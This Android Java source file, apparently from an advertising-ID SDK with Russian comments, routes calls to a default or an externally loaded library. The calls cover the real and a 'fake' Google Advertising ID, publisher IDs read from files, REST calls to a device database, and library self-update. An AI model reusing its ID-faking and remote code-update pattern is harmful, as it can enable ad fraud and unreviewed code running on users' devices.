package com.advertising_id_service.appclick.googleadvertisingidservice;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.GoogleAdvertisingIdGetter_Default;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.GoogleAdvertisingIdGetter_FromExternalLib;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter;
import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.CreateParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.DeleteParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.InstallParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.ReadParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.UpdateParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;

import com.crashlytics.android.Crashlytics;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.IOException;
import java.util.List;

import io.fabric.sdk.android.Fabric;

public class GoogleAdvertisingIdGetter implements IGoogleAdvertisingIdGetter {
    //*****************************************************************************
    //************************ Методы доступные пользователям *********************
    //*****************************************************************************
    @Override
    public String getVersion(Context cnt){
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getVersion(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getVersion(cnt);
        }
    }

    @Override
    public String getOriginalID(final Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getOriginalID(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getOriginalID(cnt);
        }
    }

    @Override
    public String getFakeGaid(final Context cnt /*, String callSource, String callDestination*/ ) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getFakeGaid(cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getFakeGaid(cnt);
        }
    }

    @Override
    public String generateGUID(GenerateIDType control_parameter, Context cnt) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().generateGUID(control_parameter, cnt);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().generateGUID(control_parameter, cnt);
        }
    }
    public String generateGUID(Context cnt) {
        return generateGUID(GenerateIDType.DEFAULT, cnt);
    }

    @Override
    public List<String> getFilePublisherIDs(PublusherIDType control_parameter, Context cnt, PublisherIDMask mask) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getFilePublisherIDs(control_parameter, cnt, mask);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getFilePublisherIDs(control_parameter, cnt, mask);
        }
    }
    public List<String> getFilePublisherIDs(Context cnt, PublisherIDMask mask) {
        return getFilePublisherIDs(PublusherIDType.DEFAULT, cnt, mask);
    }

    @Override
    public String getInnerPublisherIDs(PublusherIDType control_parameter, Context cnt, String key) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getInnerPublisherIDs(control_parameter, cnt, key);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getInnerPublisherIDs(control_parameter, cnt, key);
        }
    }
    public String getInnerPublisherIDs(Context cnt, String key) {
        return getInnerPublisherIDs(PublusherIDType.DEFAULT, cnt, key);
    }

    @Override
    public String getGAID(Context cnt, String callDestination)  throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().getGAID(cnt, callDestination);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().getGAID(cnt, callDestination);
        }
    }

    //*****************************************************************************
    //************************ Методы работы с REST *******************************
    //*****************************************************************************
    //Метод добавляет в базу информацию по устрйоству(его GAID-у). В базе создаётся запись c DeviceInfo.guid
    @Override
    public ResultCreate rest_create(final CreateParameters param)
    {
        if (param.isAsincStart()) {
            LoaderManager.LoaderCallbacks<ResultCreate> tmp = new LoaderManager.LoaderCallbacks<ResultCreate>() {
                @SuppressLint("StaticFieldLeak")
                @Override
                public Loader<ResultCreate> onCreateLoader(int i, Bundle bundle) {
                    return new AsyncTaskLoader<ResultCreate>(param.getCnt()) {
                        public ResultCreate loadInBackground() {
                            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_create(param);
                            } else {
                                return new GoogleAdvertisingIdGetter_Default().rest_create(param);
                            }
                        }
                    };
                }

                @Override
                public void onLoadFinished(Loader<ResultCreate> loader, ResultCreate result) {
                    if (param.getOnResultListener() == null) return;
                    param.getOnResultListener().onResult((result == null ? RestServicer.CODE_NULL_RESULT : RestServicer.CODE_OK), result);
                }

                @Override
                public void onLoaderReset(Loader<ResultCreate> loader) {
                }
            };
            Loader<ResultCreate> l = param.getLm().restartLoader(RestServicer.LOADER_CREATE, null, tmp);
            l.forceLoad();
            return null;
        }
        else {
            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_create(param);
            } else {
                return new GoogleAdvertisingIdGetter_Default().rest_create(param);
            }
        }
    }

    //Метод добавляет информацию по конкретной инсталяции. InstallationInfo
    // Пример использования:
    //    GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
    //    PublisherIDMask   m  = new PublisherIDMask("GooGames,AppLandGames,AppClickGames,gameclub","_", ".zip,.apk");
    //    InstallationInfo  ii = new InstallationInfo(getApplicationContext(), "", m);
    //    InstallParameters bp = new InstallParameters().setCnt(getApplicationContext())
    //      .setLm(getSupportLoaderManager())
    //      .setCallDestination("")
    //      .setPass("1111")
    //      .setLogin("test")
    //      .setAsincStart(true)
    //      .setForceStart(false)
    //      .setInstallInfo(ii)
    //      .setOnResultListener(new IRESTResultListener<ResultInstall>() {
    //        @Override
    //        public void onResult(int i, ResultInstall r) {
    //          if (r!=null) {Log.i("Log", "{" + r.error_msg + "," + r.error_id + "," + r.result + "," + r.guid + "}");}
    //        }
    //      });
    //   g.rest_install(bp);
    //
    @Override
    public ResultInstall rest_install(final InstallParameters param)
    {
        if (param.isAsincStart()) {
            LoaderManager.LoaderCallbacks<ResultInstall> tmp = new LoaderManager.LoaderCallbacks<ResultInstall>() {
                @SuppressLint("StaticFieldLeak")
                @Override
                public Loader<ResultInstall> onCreateLoader(int i, Bundle bundle) {
                    return new AsyncTaskLoader<ResultInstall>(param.getCnt()) {
                        public ResultInstall loadInBackground() {
                            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_install(param);
                            } else {
                                return new GoogleAdvertisingIdGetter_Default().rest_install(param);
                            }
                        }
                    };
                }

                @Override
                public void onLoadFinished(Loader<ResultInstall> loader, ResultInstall result) {
                    if (param.getOnResultListener() == null) return;
                    param.getOnResultListener().onResult((result == null ? RestServicer.CODE_NULL_RESULT : RestServicer.CODE_OK), result);
                }

                @Override
                public void onLoaderReset(Loader<ResultInstall> loader) {
                }
            };
            Loader<ResultInstall> l = param.getLm().restartLoader(RestServicer.LOADER_INSTALL, null, tmp);
            l.forceLoad();
            return null;
        }
        else {
            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_install(param);
            } else {
                return new GoogleAdvertisingIdGetter_Default().rest_install(param);
            }
        }
    }

    //Метод удаляет из базы информации по устрйоству(его GAID-у).
    @Override
    public ResultRead rest_read(final ReadParameters param)
    {
        if (param.isAsincStart()) {
            LoaderManager.LoaderCallbacks<ResultRead> tmp = new LoaderManager.LoaderCallbacks<ResultRead>() {
                @SuppressLint("StaticFieldLeak")
                @Override
                public Loader<ResultRead> onCreateLoader(int i, Bundle bundle) {
                    return new AsyncTaskLoader<ResultRead>(param.getCnt()) {
                        public ResultRead loadInBackground() {
                            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_read(param);
                            } else {
                                return new GoogleAdvertisingIdGetter_Default().rest_read(param);
                            }
                        }
                    };
                }

                @Override
                public void onLoadFinished(Loader<ResultRead> loader, ResultRead result) {
                    if (param.getOnResultListener() == null) return;
                    param.getOnResultListener().onResult((result == null ? RestServicer.CODE_NULL_RESULT : RestServicer.CODE_OK), result);
                }

                @Override
                public void onLoaderReset(Loader<ResultRead> loader) {
                }
            };
            Loader<ResultRead> l = param.getLm().restartLoader(RestServicer.LOADER_READ, null, tmp);
            l.forceLoad();
            return null;
        }
        else {
            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_read(param);
            } else {
                return new GoogleAdvertisingIdGetter_Default().rest_read(param);
            }
        }
    }

    //Метод удаляет из базы информации по устрйоству(его GAID-у).
    @Override
    public ResultDelete rest_delete(final DeleteParameters param)
    {
        if (param.isAsincStart()) {
            LoaderManager.LoaderCallbacks<ResultDelete> tmp = new LoaderManager.LoaderCallbacks<ResultDelete>() {
                @SuppressLint("StaticFieldLeak")
                @Override
                public Loader<ResultDelete> onCreateLoader(int i, Bundle bundle) {
                    return new AsyncTaskLoader<ResultDelete>(param.getCnt()) {
                        public ResultDelete loadInBackground() {
                            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_delete(param);
                            } else {
                                return new GoogleAdvertisingIdGetter_Default().rest_delete(param);
                            }
                        }
                    };
                }

                @Override
                public void onLoadFinished(Loader<ResultDelete> loader, ResultDelete result) {
                    if (param.getOnResultListener() == null) return;
                    param.getOnResultListener().onResult((result == null ? RestServicer.CODE_NULL_RESULT : RestServicer.CODE_OK), result);
                }

                @Override
                public void onLoaderReset(Loader<ResultDelete> loader) {
                }
            };
            Loader<ResultDelete> l = param.getLm().restartLoader(RestServicer.LOADER_DELETE, null, tmp);
            l.forceLoad();
            return null;
        }
        else {
            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_delete(param);
            } else {
                return new GoogleAdvertisingIdGetter_Default().rest_delete(param);
            }
        }

    }

    //Метод отпроавляет обновление информации по устрйоству(его GAID-у).
    @Override
    public ResultUpdate rest_update(final UpdateParameters param) {
        if (param.isAsincStart()) {
            LoaderManager.LoaderCallbacks<ResultUpdate> tmp = new LoaderManager.LoaderCallbacks<ResultUpdate>() {
                @SuppressLint("StaticFieldLeak")
                @Override
                public Loader<ResultUpdate> onCreateLoader(int i, Bundle bundle) {
                    return new AsyncTaskLoader<ResultUpdate>(param.getCnt()) {
                        public ResultUpdate loadInBackground() {
                            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_update(param);
                            } else {
                                return new GoogleAdvertisingIdGetter_Default().rest_update(param);
                            }
                        }
                    };
                }

                @Override
                public void onLoadFinished(Loader<ResultUpdate> loader, ResultUpdate result) {
                    if (param.getOnResultListener() == null) return;
                    param.getOnResultListener().onResult((result == null ? RestServicer.CODE_NULL_RESULT : RestServicer.CODE_OK), result);
                }

                @Override
                public void onLoaderReset(Loader<ResultUpdate> loader) {
                }
            };
            Loader<ResultUpdate> l = param.getLm().restartLoader(RestServicer.LOADER_UPDATE, null, tmp);
            l.forceLoad();
            return null;
        }
        else {
            if (ExternalLibServicer.isExternalLibAccessible(param.getCnt())) { //Если выполняем из внешней библиотеки
                return new GoogleAdvertisingIdGetter_FromExternalLib().rest_update(param);
            } else {
                return new GoogleAdvertisingIdGetter_Default().rest_update(param);
            }
        }
    }

    //*****************************************************************************
    //*************** Методы работы с обновлением библиотеки **********************
    //*****************************************************************************
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    //Проверить последнюю версию библиотеки и обновить её
    // @param cnt  - контекст
    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
    // @param GAID - GAID устройства
    //
    @Override
    public boolean libUpdate(Context cnt, LoaderManager lm, String GAID) {
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            return new GoogleAdvertisingIdGetter_FromExternalLib().libUpdate(cnt, lm, GAID);
        }
        else
        {
            return new GoogleAdvertisingIdGetter_Default().libUpdate(cnt, lm, GAID);
        }
    }


    //Метод который надо вызвать в onCreate. Производит инициализацию библиотеки:
    // - запускает службу автообновления;
    // - пока всё.
    @Override
    public void initialize(Context cnt, LoaderManager lm)
    {
        Fabric.with(cnt, new Crashlytics());
      //  Fabric.with(this, new Crashlytics());
        if (ExternalLibServicer.isExternalLibAccessible(cnt)){ //Если выполняем из внешней библиотеки
            new GoogleAdvertisingIdGetter_FromExternalLib().initialize(cnt, lm);
        }
        else
        {
            new GoogleAdvertisingIdGetter_Default().initialize(cnt, lm);
        }
    }
}

































